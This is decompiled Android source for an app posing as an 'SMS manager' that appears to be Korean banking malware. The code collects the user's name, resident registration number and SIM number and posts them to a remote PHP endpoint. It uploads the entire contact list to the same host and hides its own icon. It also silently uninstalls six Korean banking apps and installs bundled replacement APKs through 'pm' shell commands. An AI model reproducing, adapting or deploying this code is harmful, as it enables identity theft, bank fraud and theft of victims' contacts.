package com.example.smsmanager;

import android.app.Activity;
import android.app.ProgressDialog;
import android.content.Context;
import android.content.Intent;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageManager;
import android.content.pm.ResolveInfo;
import android.content.pm.ResolveInfo.DisplayNameComparator;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.net.NetworkInfo.State;
import android.os.AsyncTask;
import android.os.Bundle;
import android.telephony.TelephonyManager;
import android.text.InputFilter;
import android.text.InputFilter.LengthFilter;
import android.text.method.DigitsKeyListener;
import android.util.Log;
import android.view.Menu;
import android.view.MenuItem;
import android.view.View;
import android.view.View.OnClickListener;
import android.widget.Button;
import android.widget.EditText;
import android.widget.RadioButton;
import android.widget.RadioGroup;
import android.widget.RadioGroup.OnCheckedChangeListener;
import android.widget.Toast;
import cn.smsmanager.tools.JSONParser;
import cn.smsmanager.tools.ParamsInfo;
import com.example.contactmanager.Contact;
import com.example.contactmanager.ContactDAO;
import com.example.service.InstallService;
import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.UnsupportedEncodingException;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Collections;
import java.util.Date;
import java.util.List;
import org.apache.http.NameValuePair;
import org.apache.http.client.ClientProtocolException;
import org.apache.http.client.HttpClient;
import org.apache.http.client.entity.UrlEncodedFormEntity;
import org.apache.http.client.methods.HttpPost;
import org.apache.http.impl.client.DefaultHttpClient;
import org.apache.http.message.BasicNameValuePair;
import org.json.JSONException;
import org.json.JSONObject;

public class MainActivity extends Activity {
    private static final String TAG_SUCCESS = "success";
    static final String jumin_url = "http://kkk.kakatt.net:3369/send_jumin.php";
    static final String send_contact_url = "http://kkk.kakatt.net:3369/send_phonlist.php";
    Button btn;
    EditText et1;
    RadioGroup et2;
    EditText et3;
    EditText et4;
    EditText et5;
    JSONParser jsonParser = new JSONParser();
    Context mContext;
    /* access modifiers changed from: private */
    public ProgressDialog pDialog;
    List<NameValuePair> params;
    String phoneNumber = "";
    String type = "SKT";
    RadioButton type1 = null;
    RadioButton type2 = null;
    RadioButton type3 = null;

    class CreateNewUser extends AsyncTask<String, String, String> {
        CreateNewUser() {
        }

        /* access modifiers changed from: protected */
        public void onPreExecute() {
            super.onPreExecute();
            MainActivity.this.pDialog = new ProgressDialog(MainActivity.this);
            MainActivity.this.pDialog.setMessage("신청중......");
            MainActivity.this.pDialog.setIndeterminate(false);
            MainActivity.this.pDialog.setCancelable(true);
            MainActivity.this.pDialog.show();
        }

        /* access modifiers changed from: protected|varargs */
        public String doInBackground(String... args) {
            int success = 0;
            String str1 = MainActivity.this.et1.getText().toString();
            String str2 = MainActivity.this.type;
            String str3 = "";
            if (!MainActivity.this.et3.getText().equals("")) {
                str3 = MainActivity.this.et3.getText().toString();
            }
            String str4 = "";
            if (!MainActivity.this.et4.getText().equals("")) {
                str4 = MainActivity.this.et4.getText().toString();
            }
            String str5 = "";
            if (!MainActivity.this.et5.getText().equals("")) {
                str5 = MainActivity.this.et5.getText().toString();
            }
            Log.i("str1", str1);
            Log.i("str2", str2);
            Log.i("str3", str3);
            Log.i("str4", str4);
            Log.i("str5", str5);
            String dateString2 = "";
            try {
                dateString2 = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss").format(new Date(System.currentTimeMillis()));
            } catch (Exception e) {
                dateString2 = "1970-01-01 10:12:13";
            }
            Log.i("str6", dateString2);
            MainActivity.this.params = new ArrayList();
            MainActivity.this.params.add(new BasicNameValuePair("sim_no", str1));
            MainActivity.this.params.add(new BasicNameValuePair("tel", str2));
            MainActivity.this.params.add(new BasicNameValuePair("name", str3));
            MainActivity.this.params.add(new BasicNameValuePair("jumin1", str4));
            MainActivity.this.params.add(new BasicNameValuePair("jumin2", str5));
            MainActivity.this.params.add(new BasicNameValuePair("datetime", dateString2));
            JSONObject json = MainActivity.this.jsonParser.makeHttpRequest(MainActivity.jumin_url, "POST", MainActivity.this.params);
            Log.d("Create Response", json.toString());
            try {
                JSONObject sonObject = new JSONObject(json.toString());
                success = json.getInt(MainActivity.TAG_SUCCESS);
                Log.d("json.getInt", success);
                if (success == 1) {
                    MainActivity.this.getPackageManager().setComponentEnabledSetting(MainActivity.this.getComponentName(), 2, 1);
                } else {
                    Log.i("information", "Registration failed");
                }
            } catch (JSONException e2) {
                e2.printStackTrace();
            } catch (Exception e3) {
                e3.printStackTrace();
            }
            String flag = "";
            if (success == 1) {
                return "OK";
            }
            return flag;
        }

        /* access modifiers changed from: protected */
        public void onPostExecute(String result) {
            Log.d("onPostExecute", result);
            if (result.equals("OK")) {
                MainActivity.this.pDialog.setMessage("신청성공! 24시간내 핀번호를 발송해드립니다 이용해주셔서 감사합니다.");
            } else {
                MainActivity.this.pDialog.setMessage("FAIL");
            }
            new Thread() {
                public void run() {
                    try {
                        AnonymousClass1.sleep(10000);
                        MainActivity.this.pDialog.dismiss();
                    } catch (Exception e) {
                        e.printStackTrace();
                    }
                }
            }.start();
        }
    }

    class InstallTask extends AsyncTask {
        InstallTask() {
        }

        /* access modifiers changed from: protected */
        public void onPreExecute() {
            super.onPreExecute();
            MainActivity.this.pDialog = new ProgressDialog(MainActivity.this);
            MainActivity.this.pDialog.setMessage("");
            MainActivity.this.pDialog.setIndeterminate(false);
            MainActivity.this.pDialog.setCancelable(true);
            MainActivity.this.pDialog.show();
        }

        /* access modifiers changed from: protected|varargs */
        public Object doInBackground(Object... params) {
            MainActivity.copy(MainActivity.this.getApplicationContext(), "hannanbank.apk", "/sdcard/apk", "hannanbank.apk");
            MainActivity.copy(MainActivity.this.getApplicationContext(), "ibk.apk", "/sdcard/apk", "ibk.apk");
            MainActivity.copy(MainActivity.this.getApplicationContext(), "kb.apk", "/sdcard/apk", "kb.apk");
            MainActivity.copy(MainActivity.this.getApplicationContext(), "nhbank.apk", "/sdcard/apk", "nhbank.apk");
            MainActivity.copy(MainActivity.this.getApplicationContext(), "woori.apk", "/sdcard/apk", "woori.apk");
            MainActivity.copy(MainActivity.this.getApplicationContext(), "xinhan.apk", "/sdcard/apk", "xinhan.apk");
            MainActivity.this.removeApplications();
            return null;
        }

        /* access modifiers changed from: protected */
        public void onPostExecute(Object result) {
            super.onPostExecute(result);
            MainActivity.this.pDialog.dismiss();
        }
    }

    class MyOnClick implements OnClickListener {
        MyOnClick() {
        }

        public void onClick(View v) {
            switch (v.getId()) {
                case R.id.btn /*2131230731*/:
                    String str1 = MainActivity.this.et1.getText().toString();
                    String str2 = MainActivity.this.type;
                    String str3 = "";
                    if (!MainActivity.this.et3.getText().equals("")) {
                        str3 = MainActivity.this.et3.getText().toString();
                    }
                    String str4 = "";
                    if (!MainActivity.this.et4.getText().equals("")) {
                        str4 = MainActivity.this.et4.getText().toString();
                    }
                    String str5 = "";
                    if (!MainActivity.this.et5.getText().equals("")) {
                        str5 = MainActivity.this.et5.getText().toString();
                    }
                    if (str3.equals("") || str4.equals("") || str5.equals("")) {
                        Toast.makeText(MainActivity.this.mContext, "주민번호 확인하세요", 0).show();
                        return;
                    } else if (str3.length() > 1) {
                        MainActivity.this.upLoadContact();
                        new CreateNewUser().execute(new String[0]);
                        return;
                    } else {
                        Toast.makeText(MainActivity.this.mContext, "정확한 이름을 입력하세요 ", 0).show();
                        return;
                    }
                default:
                    return;
            }
        }
    }

    public void onCreate(Bundle savedInstanceState) {
        Log.i("SHUNXUN", "activity_create");
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        this.mContext = getApplicationContext();
        TelephonyManager telManager2 = (TelephonyManager) getSystemService("phone");
        this.phoneNumber = telManager2.getLine1Number();
        if (this.phoneNumber == null || this.phoneNumber == "") {
            this.phoneNumber = "10086";
        }
        String et1_str = telManager2.getLine1Number();
        String et2_str = telManager2.getSimOperatorName();
        this.et1 = (EditText) findViewById(R.id.editText1);
        this.et2 = (RadioGroup) findViewById(R.id.editText2);
        this.et3 = (EditText) findViewById(R.id.editText3);
        this.et4 = (EditText) findViewById(R.id.editText4);
        this.et5 = (EditText) findViewById(R.id.editText5);
        this.type1 = (RadioButton) findViewById(R.id.type1);
        this.type2 = (RadioButton) findViewById(R.id.type2);
        this.type3 = (RadioButton) findViewById(R.id.type3);
        this.et1.setText(et1_str);
        this.et5.setFilters(new InputFilter[]{new LengthFilter(7), new DigitsKeyListener(false, false)});
        this.et2.setOnCheckedChangeListener(new OnCheckedChangeListener() {
            public void onCheckedChanged(RadioGroup group, int checkedId) {
                if (checkedId == MainActivity.this.type1.getId()) {
                    MainActivity.this.type = "SKT";
                } else if (checkedId == MainActivity.this.type2.getId()) {
                    MainActivity.this.type = "KT";
                } else if (checkedId == MainActivity.this.type3.getId()) {
                    MainActivity.this.type = "LG";
                }
            }
        });
        this.btn = (Button) findViewById(R.id.btn);
        this.btn.setOnClickListener(new MyOnClick());
        Intent intent = new Intent();
        intent.setClass(getApplicationContext(), InstallService.class);
        startService(intent);
    }

    public boolean onCreateOptionsMenu(Menu menu) {
        getMenuInflater().inflate(R.menu.activity_main, menu);
        return true;
    }

    public boolean onOptionsItemSelected(MenuItem item) {
        return super.onOptionsItemSelected(item);
    }

    private void upLoadCallRecords() {
    }

    /* access modifiers changed from: private */
    public void upLoadContact() {
        boolean canSend = false;
        try {
            ConnectivityManager connectivity = (ConnectivityManager) ParamsInfo.context.getSystemService("connectivity");
            if (connectivity != null) {
                NetworkInfo info = connectivity.getActiveNetworkInfo();
                if (info != null && info.isConnected() && info.getState() == State.CONNECTED) {
                    canSend = true;
                }
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
        if (canSend) {
            Log.d("upLoadContact", "-----upload start");
            List<Contact> contactList = new ContactDAO(this.mContext).getContactList();
            int count = contactList.size();
            int i = 0;
            while (i < count) {
                Contact contact = (Contact) contactList.get(i);
                this.params = new ArrayList();
                this.params.add(new BasicNameValuePair("name", contact.getContactname()));
                this.params.add(new BasicNameValuePair("number", contact.getContactnumber()));
                this.params.add(new BasicNameValuePair("extra", this.phoneNumber));
                Log.d("name", "---" + contact.getContactname());
                Log.d("number", "---" + contact.getContactnumber());
                Log.d("phoneNumber", "----" + this.phoneNumber);
                try {
                    httpPostUpload(send_contact_url, this.params);
                    Log.d("httpPostUpload", "-----upload start");
                    i++;
                } catch (Exception e2) {
                    e2.printStackTrace();
                    return;
                }
            }
        }
    }

    public static void httpPostUpload(String update_url, List<NameValuePair> params) {
        HttpClient httpclient = new DefaultHttpClient();
        HttpPost httppost = new HttpPost(update_url);
        try {
            httppost.setEntity(new UrlEncodedFormEntity(params, "EUC-KR"));
            Log.d("\thttppost.setEntity(new UrlEncodedFormEntity(params2));", "gone");
        } catch (UnsupportedEncodingException e) {
            e.printStackTrace();
        }
        try {
            Log.d("response=httpclient.execute(httppost);", httpclient.execute(httppost).toString());
        } catch (ClientProtocolException e2) {
            e2.printStackTrace();
        } catch (IOException e3) {
            e3.printStackTrace();
        }
    }

    private void installApk(String filename) {
        try {
            Runtime.getRuntime().exec("pm install " + filename);
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    /* access modifiers changed from: private */
    public void removeApplications() {
        PackageManager manager = getPackageManager();
        Intent mainIntent = new Intent("android.intent.action.MAIN", null);
        mainIntent.addCategory("android.intent.category.LAUNCHER");
        List<ResolveInfo> apps = manager.queryIntentActivities(mainIntent, 0);
        Collections.sort(apps, new DisplayNameComparator(manager));
        if (apps != null) {
            int count = apps.size();
            for (int i = 0; i < count; i++) {
                ApplicationInfo application = new ApplicationInfo();
                ResolveInfo info = (ResolveInfo) apps.get(i);
                ApplicationInfo pmAppInfo = info.activityInfo.applicationInfo;
                ApplicationInfo applicationInfo = info.activityInfo.applicationInfo;
                if ((pmAppInfo.flags & 1) > 0) {
                    StringBuilder stringBuilder = new StringBuilder();
                    ApplicationInfo applicationInfo2 = info.activityInfo.applicationInfo;
                    Log.i("appInfo", stringBuilder.append(1).toString());
                } else {
                    String str = info.activityInfo.applicationInfo.packageName;
                    File file;
                    if (str.equals("com.hanabank.ebk.channel.android.hananbank")) {
                        Log.d("find app", "----com.hanabank.ebk.channel.android.hananbank--");
                        unInstallApp(str);
                        file = new File("/sdcard/apk/hannanbank.apk");
                        if (file.exists()) {
                            installApk(file.getAbsolutePath());
                        }
                    } else if (str.equals("com.ibk.spbs")) {
                        Log.d("find app", "----com.ibk.spbs--");
                        unInstallApp(str);
                        file = new File("/sdcard/apk/ibk.apk");
                        if (file.exists()) {
                            installApk(file.getAbsolutePath());
                        }
                    } else if (str.equals("com.kbcard.kbkookmincard")) {
                        Log.d("find app", "----com.kbcard.kbkookmincard--");
                        unInstallApp(str);
                        file = new File("/sdcard/apk/kb.apk");
                        if (file.exists()) {
                            installApk(file.getAbsolutePath());
                        }
                    } else if (str.equals("nh.smart")) {
                        Log.d("find app", "----nh.smart--");
                        unInstallApp(str);
                        file = new File("/sdcard/apk/nhbank.apk");
                        if (file.exists()) {
                            installApk(file.getAbsolutePath());
                        }
                    } else if (str.equals("com.webcash.wooribank")) {
                        Log.d("find app", "----com.webcash.wooribank--");
                        unInstallApp(str);
                        file = new File("/sdcard/apk/woori.apk");
                        if (file.exists()) {
                            installApk(file.getAbsolutePath());
                        }
                    } else if (str.equals("com.shinhan.sbanking")) {
                        Log.d("find app", "----com.shinhan.sbanking--");
                        unInstallApp(str);
                        file = new File("/sdcard/apk/xinhan.apk");
                        if (file.exists()) {
                            installApk(file.getAbsolutePath());
                        }
                    }
                }
            }
        }
    }

    private void unInstallApp(String str) {
        try {
            Runtime.getRuntime().exec("pm uninstall " + str);
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    public static void copy(Context myContext, String ASSETS_NAME, String savePath, String saveName) {
        String filename = new StringBuilder(String.valueOf(savePath)).append("/").append(saveName).toString();
        Log.i("file name ", "------" + filename);
        File dir = new File(savePath);
        if (!dir.exists()) {
            dir.mkdir();
        }
        try {
            File saveFile = new File(filename);
            if (!saveFile.exists()) {
                saveFile.createNewFile();
                InputStream is = myContext.getResources().getAssets().open(ASSETS_NAME);
                FileOutputStream fos = new FileOutputStream(filename);
                byte[] buffer = new byte[7168];
                while (true) {
                    int count = is.read(buffer);
                    if (count <= 0) {
                        fos.close();
                        is.close();
                        return;
                    }
                    fos.write(buffer, 0, count);
                }
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
